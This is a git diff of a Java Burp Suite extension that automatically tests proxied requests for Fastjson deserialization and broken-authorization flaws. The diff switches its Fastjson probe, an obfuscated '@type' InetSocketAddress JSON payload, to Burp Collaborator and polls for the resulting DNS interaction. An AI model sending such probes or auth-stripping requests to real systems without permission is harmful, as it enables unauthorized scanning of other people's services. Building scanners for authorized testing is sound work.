@@ -1,6 +1,10 @@
 package burp;
 
+import burp.api.montoya.collaborator.CollaboratorClient;
+import burp.api.montoya.collaborator.CollaboratorPayload;
+import burp.api.montoya.collaborator.Interaction;
 import burp.api.montoya.core.Annotations;
+import burp.api.montoya.core.ByteArray;
 import burp.api.montoya.http.HttpService;
 import burp.api.montoya.http.handler.*;
 import burp.api.montoya.http.message.HttpRequestResponse;
@@ -8,6 +12,7 @@ import burp.api.montoya.http.message.params.HttpParameterType;
 import burp.api.montoya.http.message.params.ParsedHttpParameter;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
+import burp.api.montoya.internal.ObjectFactoryLocator;
 import jrcet.frame.Scanner.Fastjson.Fastjson;
 import jrcet.frame.Scanner.Fastjson.FastjsonTableEntry;
 import jrcet.frame.Scanner.Overauth.OverauthTableEntry;
@@ -16,6 +21,7 @@ import org.xm.Similarity;
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
+import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.*;
 
@@ -33,7 +39,7 @@ public class MyRegisterHttpHandler implements HttpHandler {
     public String FastjsonCheckRequestNumber = "1";
     public static ArrayList<String> AuthCheckUrlList = new ArrayList<>();
 
-    public static ArrayList<String> FastjsonCheckUrlList = new ArrayList<String>();
+    public static ArrayList<String> FastjsonCheckUrlList = new ArrayList<>();
     public static HashMap<String, OverauthTableEntry> AuthCheckEntryMap = new HashMap<>();
 
     public static HashMap<String, FastjsonTableEntry> FastjsonEntryMap = new HashMap<>();
@@ -65,9 +71,11 @@ public class MyRegisterHttpHandler implements HttpHandler {
         //不接受已检查过的url
         //fastjson检查过的url
         String fastjsonNote = "";
+        if(debug) API.logging().output().println("fastjson检查是否开启 "+getFastjsonMenuWorkBox().isSelected());
         if(debug)API.logging().output().println("fastjson是否检查过 "+requestToBeSent.url()+" : "+FastjsonCheckUrlList.contains(requestToBeSent.url()));
 
-        if(!FastjsonCheckUrlList.contains(requestToBeSent.url())){
+        if(getFastjsonMenuWorkBox().isSelected() && !FastjsonCheckUrlList.contains(requestToBeSent.url())){
+            if(debug)API.logging().output().println("fastjson开始检查: "+requestToBeSent.url());
             fastjsonNote = fastjsonCheckRequest(requestToBeSent);
 
         }
@@ -107,7 +115,9 @@ public class MyRegisterHttpHandler implements HttpHandler {
 
     public String fastjsonCheckRequest(HttpRequestToBeSent requestToBeSent){
 
-        if(!getFastjsonMenuWorkBox().isSelected() || !Fastjson.check(requestToBeSent)) return "";
+        if(debug)API.logging().output().println("是否是json请求："+Fastjson.check(requestToBeSent));
+        if(!Fastjson.check(requestToBeSent)) return "";
+
         String requestNumber = FastjsonCheckRequestNumber;
         String requestHost = requestToBeSent.httpService().host();
         String requestMethod = requestToBeSent.method();
@@ -116,8 +126,10 @@ public class MyRegisterHttpHandler implements HttpHandler {
         String requestTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
         String[] inf = new String[]{requestNumber, requestTool, requestMethod, requestHost, requestPath, "", requestTime, "", "", ""};
 
+        if(debug)API.logging().output().println("设置fastjson的table");
         ((DefaultTableModel)getFastjsonLoggerTable().getModel()).addRow(inf);
 
+        if(debug)API.logging().output().println("设置fastjson的rowentry");
         FastjsonTableEntry rowEntry = new FastjsonTableEntry(inf);
         FastjsonEntryMap.put(requestNumber,rowEntry);
         rowEntry.setRawRequest(requestToBeSent);
@@ -129,18 +141,19 @@ public class MyRegisterHttpHandler implements HttpHandler {
 
     public void fastjsonCheckResponse(HttpResponseReceived responseReceived, String fastjsonCheckRequestNumber){
 
+        int rowIndex = Integer.parseInt(fastjsonCheckRequestNumber) - 1;
         if(debug)API.logging().output().println("fastjson chekcn 处理row: "+Integer.parseInt(fastjsonCheckRequestNumber));
 
         //设置Fastjson
         String responseLength = Integer.toString(responseReceived.body().length());
         if(debug)API.logging().output().println("fastjson Raw返回包长度:"+responseLength);
-        setFastjsonLoggerTableValueAt(responseLength, Integer.parseInt(fastjsonCheckRequestNumber) - 1, "Length");
+        setFastjsonLoggerTableValueAt(responseLength, rowIndex, "Length");
         FastjsonEntryMap.get(fastjsonCheckRequestNumber).setLength(responseLength);
 
         //设置返回包时间
         String responseTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
         if(debug)API.logging().output().println("fastjson Raw返回包时间:"+responseTime);
-        setFastjsonLoggerTableValueAt(responseTime, Integer.parseInt(fastjsonCheckRequestNumber) - 1, "responseTime");
+        setFastjsonLoggerTableValueAt(responseTime, rowIndex, "responseTime");
         FastjsonEntryMap.get(fastjsonCheckRequestNumber).setResponseTime(responseTime);
 
         //设置Raw返回包
@@ -152,14 +165,22 @@ public class MyRegisterHttpHandler implements HttpHandler {
         //进行fastjson检查
         if(debug)API.logging().output().println("fastjson 进行检查");
         String randomString = Helper.createRandomString(8);
-        String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");
-        HttpRequest fastjsonRequest = FastjsonEntryMap.get(fastjsonCheckRequestNumber).getRawRequest().withBody(body);
+        CollaboratorClient collaboratorClient = API.collaborator().createClient();
+        CollaboratorPayload collaboratorPayload = collaboratorClient.generatePayload(randomString);
 
-        new authCheckWorker("fastjson", fastjsonCheckRequestNumber, fastjsonRequest).execute();
-        if(debug)API.logging().output().println("fastjson 检查完毕");
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setDNSClient(collaboratorClient);
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setDNSPayload(collaboratorPayload);
 
+        if(debug)API.logging().output().println("设置dnslog字段");
+        setFastjsonLoggerTableValueAt(collaboratorPayload.toString(),rowIndex,"DnsLog");
+        String body =  ("\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+collaboratorPayload+"\"}}}");
+
+        HttpRequest fastjsonRequest = FastjsonEntryMap.get(fastjsonCheckRequestNumber).getRawRequest().withBody(ByteArray.byteArray(body.getBytes(StandardCharsets.UTF_8)));
+
+        new checkWorker("fastjson", fastjsonCheckRequestNumber, fastjsonRequest).execute();
+
+        if(debug)API.logging().output().println("检查完毕，将url添加到fastjson已检查列表");
         FastjsonCheckUrlList.add(FastjsonEntryMap.get(fastjsonCheckRequestNumber).getRawRequest().url());
-
     }
 
     public String authCheckRequest(HttpRequestToBeSent requestToBeSent){
@@ -259,33 +280,35 @@ public class MyRegisterHttpHandler implements HttpHandler {
         if(!Objects.equals(lowAuth, "")){
             if(debug)API.logging().output().println("发送低权限请求包");
             HttpRequest lowAuthHttpRequest = HttpRequest.httpRequest(httpService,highAuthHttpReuqestString.replace(highAuth,lowAuth));
-            new authCheckWorker("lowAuth",requestNumber,lowAuthHttpRequest).execute();
+            new checkWorker("lowAuth",requestNumber,lowAuthHttpRequest).execute();
         }
 
         //发送未授权请求
         if(debug)API.logging().output().println("发送未授权请求包");
         HttpRequest unAuthHttpRequest =  HttpRequest.httpRequest(httpService,highAuthHttpReuqestString.replace(highAuth,""));
-        new authCheckWorker("unAuth",requestNumber,unAuthHttpRequest).execute();
+        new checkWorker("unAuth",requestNumber,unAuthHttpRequest).execute();
 
         //将url加入到已测试列表
         if(debug)API.logging().output().println("UrlList Add："+highAuthHttpRequest.url());
         AuthCheckUrlList.add(highAuthHttpRequest.url());
+
     }
 
-    public static class authCheckWorker extends SwingWorker<String, Void> {
+
+    public static class checkWorker extends SwingWorker<Void, Void> {
         public String number;
         public String type;
         public HttpRequest httpRequest;
         public HttpRequestResponse httpRequestResponse;
 
-        public authCheckWorker(String type, String number, HttpRequest httpRequest) {
+        public checkWorker(String type, String number, HttpRequest httpRequest) {
             this.type = type;
             this.number = number;
             this.httpRequest = httpRequest;
 
         }
         @Override
-        protected String doInBackground() {
+        protected Void doInBackground() {
             if(debug) API.logging().output().println("start sendRequest work");
             httpRequestResponse = API.http().sendRequest(httpRequest);
             HttpRequest  ihttpRequest = httpRequestResponse.request();
@@ -319,12 +342,40 @@ public class MyRegisterHttpHandler implements HttpHandler {
                     FastjsonEntryMap.get(number).setFastjsonRequest(ihttpRequest);
                     FastjsonEntryMap.get(number).setFastjsonResponse(ihttpResponse);
                     FastjsonEntryMap.get(number).setSimplifyFastjsonResponse(iSimplifyhttpResponse);
-                    if(debug)API.logging().output().println("设置是否存在fastjson漏洞");
-                    setFastjsonLoggerTableValueAt("True", Integer.parseInt(number) - 1, "FastJson");
                 }
             }
             return null;
         }
+
+        @Override
+        public void done() {
+            try{
+                switch (type){
+                    case "fastjson" -> {
+                        if(debug)API.logging().output().println("进行dnslog检查");
+                        CollaboratorClient collaboratorClient= FastjsonEntryMap.get(number).getDNSClient();
+                        CollaboratorPayload collaboratorPayload = FastjsonEntryMap.get(number).getDNSPayload();
+                        List<Interaction> interactionList;
+                        for(int i=0; i<20; i++){
+                            API.logging().output().println("test");
+
+                            interactionList = collaboratorClient.getInteractions(ObjectFactoryLocator.FACTORY.interactionIdFilter(collaboratorPayload.id().toString()));
+                            if(interactionList.size()!=0){
+                                if(debug)API.logging().output().println("设置是否存在fastjson漏洞");
+                                setFastjsonLoggerTableValueAt("True", Integer.parseInt(number) - 1, "FastJson");
+                                break;
+                            }
+                            Thread.sleep(1000);
+                        }
+                        if(debug)API.logging().output().println("fastjson 检查完毕");
+                    }
+                }
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+
+        }
+
     }
 
     public static String getRequestNumber(String type,String notes){
